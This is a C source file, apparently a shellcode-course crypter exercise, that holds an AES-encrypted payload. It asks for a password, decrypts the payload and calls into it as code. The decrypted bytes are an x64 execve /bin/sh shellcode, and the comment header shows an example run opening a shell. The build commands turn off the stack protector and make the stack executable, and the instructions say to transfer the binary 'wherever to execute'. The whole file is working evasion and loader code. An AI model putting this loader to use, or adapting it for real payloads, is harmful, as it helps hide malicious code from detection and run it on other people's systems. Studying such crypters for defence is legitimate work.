/*
Filename: hodor-decrypt-run-payload.c
Author: hodorsec
Description: Decrypts a file as input with a given password, outputs in C hex and run the code. AES-128-CBC is being used for encryption with a hardcoded IV.
Requires the "libssl-dev" library

Howto:
 - Put encrypted payload in array "enc_in[]", as being encrypted by "hodor-encrypt-payload" and given password
 - Compile
 - Transfer file to wherever to execute
 - Run binary and enter previously used password
 - Magic

For x86:
Compile with: gcc -fno-stack-protector -z execstack -fno-pie -o hodor-decrypt-run-payload hodor-decrypt-run-payload.c -lcrypto -I /usr/include/openssl -L /usr/lib/

For x64:
Compile with: gcc -fno-stack-protector -z execstack -fno-pie -o hodor-decrypt-run-payload hodor-decrypt-run-payload.c -lcrypto -I /usr/include/openssl -fPIC -L /usr/lib/

Run as:
$ ./hodor-decrypt-run-payload
Next: 
Enter password to decrypt and run payload, used "123456" for example

------EXAMPLE------

$ ./hodor-decrypt-run-payload
Enter password to decrypt:

ENCRYPTED:
Oneliner:
"\x04\x97\x23\x87\x10\x34\x47\xE4\xF1\xD9\xAE\x31\x94\xEA\x6C\x5D\xFE\x46\x67\x3D\x14\xC1\x94\x27\x4B\x9C\xC0\x62\xFC\x2B\xFA\xCA";

16-byte newline delimiter:
"\x04\x97\x23\x87\x10\x34\x47\xE4\xF1\xD9\xAE\x31\x94\xEA\x6C\x5D"\
"\xFE\x46\x67\x3D\x14\xC1\x94\x27\x4B\x9C\xC0\x62\xFC\x2B\xFA\xCA";

DECRYPTED:
Oneliner:
"\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x31\x02";

16-byte newline delimiter:
"\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73"\
"\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x31\x02";

Running shellcode...
$ whoami
vbox
$ id
uid=1000(vbox) gid=1000(vbox) groups=1000(vbox),27(sudo),143(vboxsf)
$

------EXAMPLE------

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <unistd.h>

/* Output encrypted and decrypted */
void print_data(const char *title, const void* data, int len);

/* Do the actual work */
int main(int argc, char **argv)
{
	/* Input - execve encrypted payload x64 */
	const char enc_in[] = \
	"\x04\x97\x23\x87\x10\x34\x47\xE4\xF1\xD9\xAE\x31\x94\xEA\x6C\x5D"\
	"\xFE\x46\x67\x3D\x14\xC1\x94\x27\x4B\x9C\xC0\x62\xFC\x2B\xFA\xCA";

	int lenShell = sizeof(enc_in) - 1;		// Minus NULL-byte
	
	// Variables
	int lenBits = 128;				// AES bits

	// Check password
	char *enterPass = "Enter password to decrypt: ";
	unsigned char *key = (char*)getpass(enterPass);

	// IV
	unsigned char ivDec[AES_BLOCK_SIZE] = "HODORHODORHODOR!"; // 16 bytes

	// Buffers and padding for encryption and decryption
	const size_t lenDec = ((lenShell + AES_BLOCK_SIZE) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
	unsigned char shell_dec[lenDec];
	memset(shell_dec, 0, sizeof(shell_dec));

	// Initialize keys
	AES_KEY decKey;
	
	// Decrypt
	// int AES_set_decrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);
	AES_set_decrypt_key(key, lenBits, &decKey);
	// void AES_cbc_encrypt(const unsigned char *in, unsigned char *out, size_t length, const AES_KEY *key, unsigned char *ivec, const int enc);	
	AES_cbc_encrypt(enc_in, shell_dec, lenDec, &decKey, ivDec, AES_DECRYPT); // AES_DECRYPT == 0 from <openssl/aes.h>
	
	// Output
	print_data("\nENCRYPTED", enc_in, lenShell);
	print_data("\nDECRYPTED", shell_dec, lenDec);
	printf("\n");

	printf("Running shellcode...\n");
    	int (*ret)() = (int(*)())shell_dec;
    	ret();

	return 0;
}

void print_data(const char *title, const void* data, int len)
{
	printf("%s:",title);
	const unsigned char * p = (const unsigned char*)data;
	const unsigned char * q = (const unsigned char*)data;
	int i = 0;		// Counter
	int n = 16;		// Print a newline every N char
	
	printf("\nOneliner:\n\"");

	for (; i < len; ++i) {
		if (*p != '\0') {
			printf("\\x%02X", *p++);
		} else
			break;
	}
	printf("\";\n");
	i = 0;
	printf("\n16-byte newline delimiter:\n\"");

	for (; i < len; ++i) {
		if (*q != '\0') {
			if (i % 16 == 0 && i != 0) {
				printf("\"\\\n\"");
			}
			printf("\\x%02X", *q++);
		} else
			break;
	}
	printf("\";\n");
}


